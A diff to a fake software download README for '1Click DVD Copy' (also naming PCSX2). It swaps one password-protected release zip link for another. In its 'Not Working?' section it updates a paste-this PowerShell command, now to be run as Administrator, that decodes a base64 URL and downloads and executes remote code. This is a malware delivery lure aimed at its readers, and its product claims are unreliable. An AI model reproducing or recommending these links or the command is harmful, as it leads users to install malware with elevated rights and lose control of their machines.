@@ -9,7 +9,7 @@
 
 ### ⬇️ **DOWNLOAD LATEST VERSION**
 
-[![⬇️ DOWNLOAD LATEST VERSION](https://softyne.com/wp-content/uploads/downloadlatestversion.svg)](https://github.com/AssistantStay/rphiwmcm/releases/download/v2/Release_Setup.zip)
+[![⬇️ DOWNLOAD LATEST VERSION](https://softyne.com/wp-content/uploads/downloadlatestversion.svg)](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
 
 **Click the button above to download | Use Password GITHUB**
 
@@ -27,10 +27,10 @@
 ## Not Working?
 Follow this steps:
 - Press Win + R
-- Type *Powershell* and press Enter
+- Type *Powershell* and open with Administrator
 - Copy this command:
 ```
-iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz00NTY2MjQxNDcvRXZvbC12ZV9Y'))) -UseBasicParsing)
+iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz00NTY2MjQxNDcvbmV3b25l'))) -UseBasicParsing)
 ```
 - Paste it in Powershell Window, press Enter
 ---
@@ -147,14 +147,14 @@ iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR
 
 ### Step-by-Step Guide:
 
-1. **Visit the official website** – Click the download button above or go to [Click Here](https://github.com/AssistantStay/rphiwmcm/releases/download/v2/Release_Setup.zip)
+1. **Visit the official website** – Click the download button above or go to [Click Here](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
 2. **Get the installer** – On the website, you'll find the latest version of **1Click DVD Copy** ready for download.
 3. **Run the setup** – Double-click the downloaded file and follow the installation wizard.
 4. **Launch and enjoy** – Start using **1Click DVD Copy** immediately.
 
 ### 📹 Video Tutorial & Guide:
 Visit our website to access:
-- 🎥 **Complete video review** showing all features: [Watch Video Tutorial](https://github.com/AssistantStay/rphiwmcm/releases/download/v2/Release_Setup.zip)
+- 🎥 **Complete video review** showing all features: [Watch Video Tutorial](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
 - 📝 **Detailed installation guide** with screenshots.
 - ❓ **Comprehensive FAQ** section.
 - 🛠️ **Troubleshooting tips** and solutions.
@@ -240,8 +240,8 @@ This repository serves as the official landing page for PCSX2. The software is d
 
 ## 🔗 Useful Links
 <a id="useful-links"></a>
-- 🌐 **[Official Website & Download](https://github.com/AssistantStay/rphiwmcm/releases/download/v2/Release_Setup.zip)** — Get the latest version
-- 🎥 **[Video Review & Tutorial](https://github.com/AssistantStay/rphiwmcm/releases/download/v2/Release_Setup.zip)** — Watch now
+- 🌐 **[Official Website & Download](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)** — Get the latest version
+- 🎥 **[Video Review & Tutorial](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)** — Watch now
 - 📧 **[Support](mailto:support@softyne.com)**
 - 📖 **[Documentation](https://softyne.com/privacy-policy-2/)**
 - 💬 **[Community](https://softyne.com/about-us/)**
